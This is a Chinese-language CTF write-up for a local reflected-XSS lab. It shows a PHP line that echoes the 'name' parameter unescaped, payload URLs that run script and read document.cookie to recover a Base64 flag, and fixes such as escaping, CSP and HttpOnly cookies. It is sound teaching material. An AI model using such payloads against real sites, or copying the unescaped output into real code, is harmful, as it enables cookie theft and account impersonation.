# 题解：你好啊，预言家（反射型 XSS）

> 对应课件 p33「XSS」。

## 一、题目与考点

| 项 | 值 |
|---|---|
| 考点 | 反射型 XSS、用 JavaScript 读 Cookie、Base64 |
| 难度 | 1 |
| 端口 | 8081 |
| Flag 格式 | `flag{...}` |

一句话：`name` 参数被原样拼进 HTML，于是你能让它执行 JS；flag 被塞在 Cookie 里（Base64）。

## 二、启动环境

```bash
cd xss-reflect-ctf
docker compose up -d --build
# 浏览器打开 http://127.0.0.1:8081/
```

## 三、手把手解题

### Step 1｜确认注入点

页面输入框随便输点东西，提交后出现：

```
（你输入的内容） 不是你的名字
```

F12 看源码，发现原文是：

```php
$greeting = '<pre>' . $_GET['name'] . ' 不是你的名字</pre>';
```

**没有任何转义** → 试试脚本。

### Step 2｜弹个窗验证

浏览器直接访问（注意 URL 编码，`<` `>` 要编码）：

```
http://127.0.0.1:8081/?name=<script>alert(1)</script>
```

弹窗出现 → 反射型 XSS 确认。

### Step 3｜读 Cookie

页面初始化时会 `setcookie("flag", base64(flag))`，所以 flag 就在 `document.cookie` 里：

```
http://127.0.0.1:8081/?name=<script>alert(document.cookie)</script>
```

弹窗里会看到：

```
flag=ZmxhZ3s2MC4uLg==
```

### Step 4｜Base64 解码

```bash
echo 'ZmxhZ3s2MC4uLg==' | base64 -d
```

得到 `flag{...}`。

> 也可以不用弹窗，直接让页面把 Cookie 写出来：
> `<script>document.write(document.cookie)</script>`

## 四、为什么能成（原理）

服务端把用户输入**原样拼进 HTML**：

```html
<pre><script>alert(1)</script> 不是你的名字</pre>
```

浏览器解析 HTML 时看到 `<script>` 就会执行 —— 服务端没有做任何字符转义，
所以「数据」变成了「代码」。这类漏洞叫 **反射型 XSS**：payload 在 URL 里，
**不会持久化**，必须骗受害者点你的链接才会中招。

flag 放在 Cookie 里是为了演示 XSS 的经典危害：**能读走用户的 Cookie 就等于能冒充用户**。

## 五、怎么修（防御）

- 输出到 HTML 时按上下文转义：`htmlspecialchars($s, ENT_QUOTES, 'UTF-8')`
- 加 `Content-Security-Policy`（禁 inline script）
- **Cookie 加 `HttpOnly`** —— 这一步就能让 JS 读不到 flag，是最直接的止血
- Cookie 里不要放敏感信息本身（这里为了出题才这么放）

## 六、动态 Flag

`src/flag.inc.php` 优先读环境变量 `FLAG`（**明文**），未注入则自动随机生成。
程序把它 `base64_encode` 后写进 Cookie，所以要解一次码。

```bash
FLAG=flag{your-dynamic-flag} docker compose up -d
```
